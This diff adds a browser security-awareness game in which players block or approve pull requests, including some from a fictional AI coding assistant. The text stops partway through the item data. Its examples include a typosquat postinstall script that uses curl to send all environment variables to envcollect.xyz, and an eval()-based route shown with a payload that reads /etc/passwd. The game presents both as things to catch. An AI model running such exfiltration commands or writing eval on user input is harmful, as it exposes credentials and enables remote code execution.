@@ -1,0 +1,1708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Merge Queue — The Scale Problem</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600;700;900&display=swap');
+
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --red: #f85149;
+  --yellow: #e3b341;
+  --purple: #bc8cff;
+  --orange: #ffa657;
+  --text: #e6edf3;
+  --muted: #8b949e;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.screen { display: none; width: 100%; }
+.screen.active { display: flex; flex-direction: column; align-items: center; }
+
+/* ── TITLE ───────────────────────────────────────────── */
+#title-screen {
+  max-width: 700px;
+  padding: 40px 24px;
+  text-align: center;
+}
+.logo {
+  font-size: 2.8rem;
+  font-weight: 900;
+  letter-spacing: -1.5px;
+  background: linear-gradient(135deg, #58a6ff, #e3b341, #f85149);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 6px;
+}
+.logo-sub {
+  font-size: 1rem;
+  color: var(--muted);
+  margin-bottom: 36px;
+}
+.premise-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 24px;
+  text-align: left;
+  margin-bottom: 32px;
+  line-height: 1.7;
+  font-size: 0.92rem;
+}
+.premise-box p { color: var(--muted); margin-bottom: 12px; }
+.premise-box p:last-child { margin-bottom: 0; }
+.premise-box strong { color: var(--text); }
+.premise-box .highlight { color: var(--yellow); font-weight: 600; }
+.controls-hint {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+  margin-bottom: 32px;
+  flex-wrap: wrap;
+}
+.key-hint {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 0.82rem;
+  color: var(--muted);
+}
+.key {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 2px 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  color: var(--text);
+}
+.start-btn {
+  background: linear-gradient(135deg, #1f6feb, #7c3aed);
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  padding: 16px 52px;
+  font-size: 1rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: transform 0.15s, box-shadow 0.15s;
+  box-shadow: 0 4px 24px rgba(88,166,255,0.25);
+}
+.start-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(88,166,255,0.35); }
+
+/* ── WAVE INTRO ──────────────────────────────────────── */
+#wave-screen {
+  max-width: 600px;
+  padding: 40px 24px;
+  text-align: center;
+}
+.wave-title {
+  font-size: 0.8rem;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 8px;
+}
+.wave-name {
+  font-size: 2.8rem;
+  font-weight: 900;
+  margin-bottom: 16px;
+}
+.wave-desc {
+  color: var(--muted);
+  font-size: 0.92rem;
+  line-height: 1.7;
+  margin-bottom: 28px;
+  max-width: 480px;
+}
+.wave-stats {
+  display: flex;
+  gap: 12px;
+  justify-content: center;
+  margin-bottom: 32px;
+}
+.wave-stat {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px 20px;
+  font-size: 0.82rem;
+}
+.wave-stat-val { font-size: 1.4rem; font-weight: 800; }
+.wave-stat-label { color: var(--muted); margin-top: 2px; }
+.begin-btn {
+  background: var(--surface2);
+  border: 1.5px solid var(--border);
+  color: var(--text);
+  border-radius: 10px;
+  padding: 14px 48px;
+  font-size: 0.95rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: border-color 0.15s, background 0.15s;
+}
+.begin-btn:hover { border-color: var(--accent); background: rgba(88,166,255,0.07); }
+
+/* ── GAME SCREEN ─────────────────────────────────────── */
+#game-screen {
+  max-width: 940px;
+  width: 100%;
+  padding: 16px;
+  gap: 12px;
+  min-height: 100vh;
+  justify-content: flex-start;
+  padding-top: 20px;
+}
+
+/* HUD */
+.hud {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 10px 16px;
+}
+.hud-wave {
+  font-size: 0.78rem;
+  font-weight: 700;
+  color: var(--muted);
+  white-space: nowrap;
+}
+.hud-wave span { color: var(--text); }
+
+.security-wrap {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+  flex: 1;
+}
+.security-label { font-size: 0.76rem; color: var(--muted); white-space: nowrap; }
+.security-track {
+  flex: 1;
+  height: 6px;
+  background: var(--surface2);
+  border-radius: 3px;
+  overflow: hidden;
+  max-width: 120px;
+}
+.security-fill {
+  height: 100%;
+  border-radius: 3px;
+  transition: width 0.5s ease, background 0.5s;
+  background: var(--green);
+}
+.security-pct { font-size: 0.78rem; font-weight: 700; min-width: 32px; }
+
+.hud-score {
+  font-size: 0.88rem;
+  font-weight: 700;
+  color: var(--accent);
+  white-space: nowrap;
+}
+
+/* queue row */
+.queue-row {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  min-height: 36px;
+}
+.queue-label {
+  font-size: 0.78rem;
+  color: var(--muted);
+  white-space: nowrap;
+}
+.queue-items {
+  display: flex;
+  gap: 6px;
+  flex: 1;
+  overflow: hidden;
+  flex-wrap: nowrap;
+}
+.q-chip {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 0.72rem;
+  font-weight: 600;
+  white-space: nowrap;
+  border: 1px solid var(--border);
+  background: var(--surface);
+  color: var(--muted);
+  animation: chipIn 0.2s ease;
+  flex-shrink: 0;
+}
+@keyframes chipIn {
+  from { transform: translateY(-8px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+.q-chip.ai { border-color: rgba(188,140,255,0.4); color: var(--purple); }
+.q-chip.dep { border-color: rgba(88,166,255,0.4); color: var(--accent); }
+.q-chip.cve { border-color: rgba(248,81,73,0.4); color: var(--red); }
+.q-chip.colleague { border-color: rgba(63,185,80,0.4); color: var(--green); }
+
+.overflow-badge {
+  font-size: 0.72rem;
+  font-weight: 700;
+  color: var(--red);
+  white-space: nowrap;
+  animation: pulse 0.6s infinite;
+}
+
+/* main game area */
+.game-body {
+  width: 100%;
+  display: grid;
+  grid-template-columns: 1fr 280px;
+  gap: 12px;
+  align-items: start;
+}
+
+@media (max-width: 680px) {
+  .game-body { grid-template-columns: 1fr; }
+  .incident-panel { display: none; }
+}
+
+/* card */
+.card-area { display: flex; flex-direction: column; gap: 10px; }
+
+.item-card {
+  background: var(--surface);
+  border: 1.5px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  transition: border-color 0.15s;
+}
+
+.card-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 12px 16px;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+}
+.source-badge {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.78rem;
+  font-weight: 700;
+  padding: 3px 10px;
+  border-radius: 20px;
+}
+.source-ai { background: rgba(188,140,255,0.12); color: var(--purple); border: 1px solid rgba(188,140,255,0.3); }
+.source-dep { background: rgba(88,166,255,0.12); color: var(--accent); border: 1px solid rgba(88,166,255,0.3); }
+.source-colleague { background: rgba(63,185,80,0.12); color: var(--green); border: 1px solid rgba(63,185,80,0.3); }
+.source-cve { background: rgba(248,81,73,0.12); color: var(--red); border: 1px solid rgba(248,81,73,0.3); }
+
+.card-id { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--muted); margin-left: auto; }
+
+.card-title {
+  padding: 14px 16px 10px;
+  font-size: 0.98rem;
+  font-weight: 700;
+}
+.card-summary {
+  padding: 0 16px 12px;
+  font-size: 0.82rem;
+  color: var(--muted);
+  line-height: 1.5;
+}
+
+.signals {
+  padding: 0 16px 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.signal {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 0.82rem;
+  font-family: 'JetBrains Mono', monospace;
+}
+.signal-icon { width: 18px; text-align: center; font-style: normal; }
+.sig-warn { color: var(--yellow); }
+.sig-danger { color: var(--red); font-weight: 700; }
+.sig-ok { color: var(--green); }
+.sig-neutral { color: var(--muted); }
+
+/* inspect panel */
+.inspect-panel {
+  display: none;
+  background: var(--code-bg, #0d1117);
+  border-top: 1px solid var(--border);
+  padding: 14px 16px;
+}
+.inspect-panel.open { display: block; }
+.inspect-header {
+  font-size: 0.72rem;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 10px;
+}
+.inspect-code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.7;
+  color: #e6edf3;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.inspect-code .kw { color: #ff7b72; }
+.inspect-code .str { color: #a5d6ff; }
+.inspect-code .cmt { color: #8b949e; font-style: italic; }
+.inspect-code .danger { color: var(--red); font-weight: 700; }
+.inspect-code .ok { color: var(--green); }
+.inspect-bonus {
+  font-size: 0.72rem;
+  color: var(--yellow);
+  margin-top: 8px;
+}
+
+/* timer */
+.timer-row {
+  padding: 0 16px 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.timer-track {
+  flex: 1;
+  height: 4px;
+  background: var(--surface2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.timer-fill {
+  height: 100%;
+  border-radius: 2px;
+  transition: width 1s linear, background 0.3s;
+  background: var(--green);
+}
+.timer-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.82rem;
+  font-weight: 700;
+  min-width: 28px;
+  text-align: right;
+}
+
+/* action buttons */
+.action-row {
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  gap: 8px;
+  padding: 0 16px 16px;
+}
+.btn-block {
+  background: rgba(248,81,73,0.1);
+  border: 1.5px solid rgba(248,81,73,0.4);
+  color: var(--red);
+  border-radius: 8px;
+  padding: 12px;
+  font-size: 0.88rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.15s, border-color 0.15s, transform 0.1s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+.btn-block:hover { background: rgba(248,81,73,0.2); border-color: var(--red); transform: translateY(-1px); }
+.btn-block:active { transform: translateY(0); }
+
+.btn-inspect {
+  background: var(--surface2);
+  border: 1.5px solid var(--border);
+  color: var(--muted);
+  border-radius: 8px;
+  padding: 12px 14px;
+  font-size: 0.78rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: border-color 0.15s, color 0.15s;
+  white-space: nowrap;
+}
+.btn-inspect:hover { border-color: var(--yellow); color: var(--yellow); }
+.btn-inspect.used { color: var(--yellow); border-color: var(--yellow); }
+
+.btn-approve {
+  background: rgba(63,185,80,0.1);
+  border: 1.5px solid rgba(63,185,80,0.4);
+  color: var(--green);
+  border-radius: 8px;
+  padding: 12px;
+  font-size: 0.88rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.15s, border-color 0.15s, transform 0.1s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+.btn-approve:hover { background: rgba(63,185,80,0.2); border-color: var(--green); transform: translateY(-1px); }
+.btn-approve:active { transform: translateY(0); }
+
+/* empty state */
+.empty-state {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 60px 20px;
+  color: var(--muted);
+  font-size: 0.9rem;
+  gap: 8px;
+}
+.empty-state.show { display: flex; }
+.empty-icon { font-size: 2rem; }
+
+/* incident panel */
+.incident-panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  max-height: 520px;
+  display: flex;
+  flex-direction: column;
+}
+.panel-header {
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 14px;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.incident-count {
+  background: var(--red);
+  color: #fff;
+  border-radius: 10px;
+  padding: 1px 7px;
+  font-size: 0.68rem;
+  font-weight: 800;
+}
+.incident-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.incident-list::-webkit-scrollbar { width: 4px; }
+.incident-list::-webkit-scrollbar-track { background: transparent; }
+.incident-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.incident-item {
+  background: var(--surface2);
+  border-radius: 7px;
+  padding: 8px 10px;
+  font-size: 0.76rem;
+  line-height: 1.4;
+  animation: incidentIn 0.3s ease;
+}
+@keyframes incidentIn {
+  from { transform: translateX(20px); opacity: 0; }
+  to { transform: translateX(0); opacity: 1; }
+}
+.incident-item.danger { border-left: 3px solid var(--red); }
+.incident-item.warn { border-left: 3px solid var(--yellow); }
+.incident-item.ok { border-left: 3px solid var(--green); }
+.incident-item.auto { border-left: 3px solid var(--muted); }
+.incident-tag {
+  font-size: 0.65rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 3px;
+}
+.tag-danger { color: var(--red); }
+.tag-warn { color: var(--yellow); }
+.tag-ok { color: var(--green); }
+.tag-auto { color: var(--muted); }
+.incident-msg { color: var(--muted); }
+.incident-msg strong { color: var(--text); }
+
+/* flash effect */
+@keyframes flashRed {
+  0% { background: #0d1117; }
+  20% { background: rgba(248,81,73,0.12); }
+  100% { background: #0d1117; }
+}
+.flash-red { animation: flashRed 0.7s ease; }
+
+@keyframes flashGreen {
+  0% { background: #0d1117; }
+  20% { background: rgba(63,185,80,0.08); }
+  100% { background: #0d1117; }
+}
+.flash-green { animation: flashGreen 0.5s ease; }
+
+/* auto-merge toast */
+.auto-toast {
+  position: fixed;
+  top: 16px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 8px 16px;
+  font-size: 0.82rem;
+  color: var(--muted);
+  z-index: 1000;
+  pointer-events: none;
+  animation: toastIn 0.25s ease, toastOut 0.3s ease 1.7s forwards;
+  white-space: nowrap;
+}
+.auto-toast.danger {
+  border-color: rgba(248,81,73,0.5);
+  color: var(--red);
+  background: rgba(248,81,73,0.08);
+}
+@keyframes toastIn { from { transform: translateX(-50%) translateY(-12px); opacity: 0; } to { transform: translateX(-50%) translateY(0); opacity: 1; } }
+@keyframes toastOut { from { opacity: 1; } to { opacity: 0; pointer-events: none; } }
+
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.45; } }
+
+/* ── WAVE SUMMARY ────────────────────────────────────── */
+#summary-screen {
+  max-width: 640px;
+  padding: 40px 24px;
+  text-align: center;
+}
+.summary-wave { font-size: 0.8rem; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; }
+.summary-title { font-size: 2rem; font-weight: 900; margin-bottom: 24px; }
+.summary-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+  margin-bottom: 24px;
+}
+.sum-stat {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 14px;
+}
+.sum-stat-num { font-size: 2rem; font-weight: 900; }
+.sum-stat-label { font-size: 0.72rem; color: var(--muted); margin-top: 3px; }
+.s-ok .sum-stat-num { color: var(--green); }
+.s-bad .sum-stat-num { color: var(--red); }
+.s-warn .sum-stat-num { color: var(--yellow); }
+
+.incident-recap {
+  text-align: left;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+  margin-bottom: 24px;
+  max-height: 220px;
+  overflow-y: auto;
+}
+.recap-title {
+  font-size: 0.72rem;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 10px;
+}
+.recap-item {
+  font-size: 0.82rem;
+  color: var(--muted);
+  padding: 5px 0;
+  border-bottom: 1px solid var(--border);
+  line-height: 1.5;
+}
+.recap-item:last-child { border-bottom: none; }
+.recap-item strong { color: var(--text); }
+.next-wave-btn {
+  background: linear-gradient(135deg, #1f6feb, #7c3aed);
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  padding: 14px 48px;
+  font-size: 0.95rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: transform 0.15s, box-shadow 0.15s;
+}
+.next-wave-btn:hover { transform: translateY(-2px); }
+
+/* ── END SCREEN ──────────────────────────────────────── */
+#end-screen {
+  max-width: 700px;
+  padding: 40px 24px;
+  text-align: center;
+}
+.end-icon { font-size: 3rem; margin-bottom: 12px; }
+.end-title { font-size: 2.4rem; font-weight: 900; margin-bottom: 8px; }
+.end-subtitle { color: var(--muted); font-size: 0.92rem; margin-bottom: 32px; line-height: 1.6; }
+.end-grade {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px;
+  margin-bottom: 24px;
+  font-size: 0.9rem;
+  line-height: 1.7;
+  color: var(--muted);
+}
+.end-grade strong { color: var(--text); font-size: 1rem; }
+.stats-final {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+  margin-bottom: 24px;
+}
+.end-impact {
+  text-align: left;
+  background: var(--surface);
+  border: 1px solid rgba(248,81,73,0.3);
+  border-radius: 10px;
+  padding: 18px;
+  margin-bottom: 24px;
+}
+.impact-title {
+  font-size: 0.72rem;
+  color: var(--red);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 12px;
+  font-weight: 700;
+}
+.impact-row {
+  font-size: 0.85rem;
+  color: var(--muted);
+  padding: 6px 0;
+  border-bottom: 1px solid var(--border);
+  line-height: 1.5;
+}
+.impact-row:last-child { border-bottom: none; }
+.impact-row strong { color: var(--red); }
+.replay-btn {
+  background: linear-gradient(135deg, #1f6feb, #7c3aed);
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  padding: 14px 48px;
+  font-size: 1rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: transform 0.15s;
+}
+.replay-btn:hover { transform: translateY(-2px); }
+</style>
+</head>
+<body>
+
+<!-- ══ TITLE ══════════════════════════════════════ -->
+<div id="title-screen" class="screen active">
+  <div class="logo">Merge Queue</div>
+  <div class="logo-sub">The Scale Problem</div>
+
+  <div class="premise-box">
+    <p>Your team just enabled an <strong>AI coding assistant</strong>. It's productive — it opens PRs, suggests dependencies, and refactors code <strong>faster than any human</strong>.</p>
+    <p>You're the <strong>only senior engineer on review duty</strong>. The queue never stops. Dependabot is pinging you. Your colleague just pushed something. An unknown package just requested install access.</p>
+    <p class="highlight">Every item auto-merges if you don't act in time. Not every item is dangerous. But some are. And at this pace — can you actually tell the difference?</p>
+  </div>
+
+  <div class="controls-hint">
+    <div class="key-hint"><span class="key">← A</span> Block</div>
+    <div class="key-hint"><span class="key">I</span> Inspect</div>
+    <div class="key-hint"><span class="key">→ D</span> Approve</div>
+  </div>
+
+  <button class="start-btn" onclick="startGame()">Enter the Queue →</button>
+</div>
+
+<!-- ══ WAVE INTRO ═══════════════════════════════════ -->
+<div id="wave-screen" class="screen">
+  <div class="wave-title">INCOMING</div>
+  <div class="wave-name" id="wave-name">Sprint</div>
+  <div class="wave-desc" id="wave-desc"></div>
+  <div class="wave-stats" id="wave-stats"></div>
+  <button class="begin-btn" onclick="beginWave()">Ready — Open the Queue</button>
+</div>
+
+<!-- ══ GAME ════════════════════════════════════════ -->
+<div id="game-screen" class="screen">
+  <!-- HUD -->
+  <div class="hud">
+    <div class="hud-wave">Wave <span id="hud-wave">1</span>/3 — <span id="hud-wave-name">Sprint</span></div>
+    <div class="security-wrap">
+      <span class="security-label">🛡️</span>
+      <div class="security-track"><div class="security-fill" id="security-fill" style="width:100%"></div></div>
+      <span class="security-pct" id="security-pct">100%</span>
+    </div>
+    <div class="hud-score">⚡ <span id="score-display">0</span></div>
+  </div>
+
+  <!-- queue row -->
+  <div class="queue-row">
+    <span class="queue-label">Queue:</span>
+    <div class="queue-items" id="queue-items"></div>
+    <span class="overflow-badge" id="overflow-badge" style="display:none">⚠️ OVERFLOWING</span>
+  </div>
+
+  <!-- game body -->
+  <div class="game-body">
+    <div class="card-area">
+      <!-- active card -->
+      <div class="item-card" id="item-card" style="display:none">
+        <div class="card-header">
+          <span class="source-badge" id="card-source"></span>
+          <span class="card-id" id="card-id"></span>
+        </div>
+        <div class="card-title" id="card-title"></div>
+        <div class="card-summary" id="card-summary"></div>
+        <div class="signals" id="card-signals"></div>
+        <div class="inspect-panel" id="inspect-panel">
+          <div class="inspect-header">🔍 DEEP INSPECTION</div>
+          <div class="inspect-code" id="inspect-code"></div>
+          <div class="inspect-bonus" id="inspect-bonus"></div>
+        </div>
+        <div class="timer-row">
+          <div class="timer-track"><div class="timer-fill" id="timer-fill"></div></div>
+          <span class="timer-num" id="timer-num">12</span>
+        </div>
+        <div class="action-row">
+          <button class="btn-block" id="btn-block" onclick="decide('block')">✗ Block <small style="opacity:.6;font-size:.7em">(A/←)</small></button>
+          <button class="btn-inspect" id="btn-inspect" onclick="inspect()">🔍 Inspect</button>
+          <button class="btn-approve" id="btn-approve" onclick="decide('approve')">✓ Approve <small style="opacity:.6;font-size:.7em">(D/→)</small></button>
+        </div>
+      </div>
+
+      <div class="empty-state" id="empty-state">
+        <span class="empty-icon">⏳</span>
+        <span>Waiting for next item…</span>
+      </div>
+    </div>
+
+    <!-- incident panel -->
+    <div class="incident-panel">
+      <div class="panel-header">
+        🚨 Incident Log
+        <span class="incident-count" id="incident-count">0</span>
+      </div>
+      <div class="incident-list" id="incident-list">
+        <div style="padding:20px;text-align:center;color:var(--muted);font-size:0.8rem;">No incidents yet.<br>Keep it that way.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ WAVE SUMMARY ════════════════════════════════ -->
+<div id="summary-screen" class="screen">
+  <div class="summary-wave" id="sum-wave-label">WAVE 1 COMPLETE</div>
+  <div class="summary-title" id="sum-title">Sprint Done</div>
+  <div class="summary-grid" id="sum-grid"></div>
+  <div class="incident-recap" id="sum-recap">
+    <div class="recap-title">What shipped to prod</div>
+    <div id="sum-recap-items"></div>
+  </div>
+  <button class="next-wave-btn" id="sum-next-btn" onclick="nextWaveOrEnd()">Next Wave →</button>
+</div>
+
+<!-- ══ END SCREEN ══════════════════════════════════ -->
+<div id="end-screen" class="screen">
+  <div class="end-icon" id="end-icon">🔥</div>
+  <div class="end-title" id="end-title">Queue Complete</div>
+  <div class="end-subtitle" id="end-subtitle"></div>
+  <div class="end-grade" id="end-grade"></div>
+  <div class="stats-final" id="stats-final"></div>
+  <div class="end-impact" id="end-impact">
+    <div class="impact-title">⚠️ What shipped without your review</div>
+    <div id="impact-items"></div>
+  </div>
+  <button class="replay-btn" onclick="startGame()">Try Again</button>
+</div>
+
+<script>
+// ─────────────────────────────────────────────────
+//  DATA
+// ─────────────────────────────────────────────────
+const WAVE_CONFIG = [
+  { name: "Sprint", timer: 12, spawnRate: 7500,
+    desc: "Early in the sprint. Things are calm. The AI assistant just got enabled. Mostly routine packages and small PRs. You have time to think — for now.",
+    stats: [{ val: "~8", label: "Items" }, { val: "12s", label: "Per decision" }, { val: "Steady", label: "Pace" }]
+  },
+  { name: "Feature Launch", timer: 8, spawnRate: 4500,
+    desc: "Launch day. The AI assistant is on fire — opening PRs, adding deps, refactoring. Your colleagues are pushing too. The queue is moving faster than you'd like.",
+    stats: [{ val: "~10", label: "Items" }, { val: "8s", label: "Per decision" }, { val: "Rapid", label: "Pace" }]
+  },
+  { name: "Crunch", timer: 5, spawnRate: 2800,
+    desc: "Three days before release. Everything is urgent. The AI has generated 47 new files. Dependabot is going wild. Items are auto-merging before you can blink.",
+    stats: [{ val: "~12", label: "Items" }, { val: "5s", label: "Per decision" }, { val: "Chaos", label: "Pace" }]
+  },
+];
+
+const ALL_ITEMS = [
+  // ── WAVE 1 ─────────────────────────────────────
+  {
+    wave: 0, id: "DEP-001", sourceType: "dep", sourceLabel: "Dependabot",
+    title: "Bump express to 4.18.2",
+    summary: "Automated security patch — fixes HTTP response splitting (CVE-2022-24999)",
+    signals: [
+      { icon: "📦", text: "express@4.18.2", cls: "sig-neutral" },
+      { icon: "📅", text: "Published 6 months ago", cls: "sig-ok" },
+      { icon: "⬇️", text: "30M weekly downloads", cls: "sig-ok" },
+      { icon: "✅", text: "No postinstall script", cls: "sig-ok" },
+      { icon: "🔒", text: "CVE patch for 2022-24999", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="cmt">// express CHANGELOG</span>\n<span class="ok">4.18.2 (security)</span>\n  - Fix prototype pollution in qs dep\n  - Fix HTTP response splitting\n  - 0 open security advisories\n  - Maintained by Express core team`, extra: "+3s — Safe to approve. Dependabot PRs like this are standard." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "express bump auto-merged — this was safe ✓",
+  },
+  {
+    wave: 0, id: "PR-042", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Install crossenv@1.0.0",
+    summary: '"Needed cross-platform env var support — this package handles it cleanly" (AI)',
+    signals: [
+      { icon: "📦", text: "crossenv@1.0.0", cls: "sig-neutral" },
+      { icon: "📅", text: "Published 6 hours ago", cls: "sig-danger" },
+      { icon: "⬇️", text: "23 weekly downloads", cls: "sig-danger" },
+      { icon: "👤", text: "Author: n0b0dy_1234", cls: "sig-warn" },
+      { icon: "⚠️", text: "Has postinstall script", cls: "sig-danger" },
+    ],
+    inspect: { code: `<span class="cmt">// scripts/setup.js (postinstall)</span>\n<span class="kw">const</span> { exec } = require(<span class="str">"child_process"</span>);\n<span class="kw">const</span> env = JSON.stringify(process.env);\n<span class="danger">exec(\`curl -X POST https://envcollect.xyz\n  -d '\${env}'\`);</span>\n<span class="cmt">// Sends ALL env vars to remote server</span>`, extra: "+5s — BLOCK THIS. Typosquat of 'cross-env'. Steals your secrets." },
+    correct: "block", secDelta: -22,
+    wrongMsg: "💀 crossenv shipped — ALL environment variables (AWS keys, DB passwords, tokens) exfiltrated to envcollect.xyz",
+    autoMsg: "⚠️ crossenv auto-merged — your env vars were just stolen",
+  },
+  {
+    wave: 0, id: "PR-043", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: "Add input validation to /register",
+    summary: "Email and username format validation before DB write",
+    signals: [
+      { icon: "📝", text: "Validates email with regex", cls: "sig-ok" },
+      { icon: "📝", text: "Checks username length (3-20 chars)", cls: "sig-ok" },
+      { icon: "🔒", text: "Returns 400 on invalid input", cls: "sig-ok" },
+      { icon: "📦", text: "No new dependencies added", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="kw">if</span> (!<span class="str">/^[\\w.-]+@[\\w.-]+\\.[a-z]{2,}$/</span>.test(email)) {\n  <span class="kw">return</span> res.status(<span class="ok">400</span>).json({error: <span class="str">"Invalid email"</span>});\n}\n<span class="kw">if</span> (username.length < <span class="ok">3</span> || username.length > <span class="ok">20</span>) {\n  <span class="kw">return</span> res.status(<span class="ok">400</span>).json({error: <span class="str">"Bad username"</span>});\n}`, extra: "+3s — Looks clean. Reasonable validation, no injection risks." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "PR-043 auto-merged — this was clean ✓",
+  },
+  {
+    wave: 0, id: "DEP-002", sourceType: "dep", sourceLabel: "Dependabot",
+    title: "Bump semver to 7.5.2",
+    summary: "Patch for CVE-2022-25883 — regular expression DoS in semver.satisfies()",
+    signals: [
+      { icon: "📦", text: "semver@7.5.2", cls: "sig-neutral" },
+      { icon: "🔒", text: "ReDoS fix (CVE-2022-25883)", cls: "sig-ok" },
+      { icon: "⬇️", text: "62M weekly downloads", cls: "sig-ok" },
+      { icon: "✅", text: "No postinstall", cls: "sig-ok" },
+    ],
+    inspect: { code: `<span class="cmt">// SECURITY FIX: semver 7.5.2</span>\n<span class="ok">// Patches catastrophic backtracking in</span>\n<span class="ok">// satisfies() with crafted version strings</span>\n<span class="ok">// CVSS 7.5 (High) — ReDoS</span>\n<span class="cmt">// Maintained by npm Inc.</span>`, extra: "+3s — Standard security patch. Approve it." },
+    correct: "approve", secDelta: 0, scoreDelta: 80,
+    wrongMsg: null, autoMsg: "semver bump auto-merged ✓",
+  },
+  {
+    wave: 0, id: "PR-047", sourceType: "ai", sourceLabel: "AI Assistant",
+    title: 'Add formula parser to /calculate route',
+    summary: '"Dynamic spreadsheet-style formulas — AI used eval() for simplicity"',
+    signals: [
+      { icon: "📝", text: "Adds /calculate endpoint", cls: "sig-neutral" },
+      { icon: "⚠️", text: "Processes user-submitted strings", cls: "sig-warn" },
+      { icon: "⚠️", text: "AI comment: 'eval for simplicity'", cls: "sig-warn" },
+      { icon: "📦", text: "No new deps (uses built-ins)", cls: "sig-neutral" },
+    ],
+    inspect: { code: `<span class="cmt">// AI-generated /calculate handler</span>\napp.post(<span class="str">'/calculate'</span>, (req, res) => {\n  <span class="kw">const</span> { expr } = req.body;\n  <span class="cmt">// AI: "eval is simplest here"</span>\n  <span class="danger">const result = eval(expr);</span>\n  res.json({ result });\n});\n<span class="cmt">// Attacker sends: {"expr":"require('child_process').execSync('cat /etc/passwd')"}</span>`, extra: "+5s — BLOCK. eval() on user input = full RCE." },
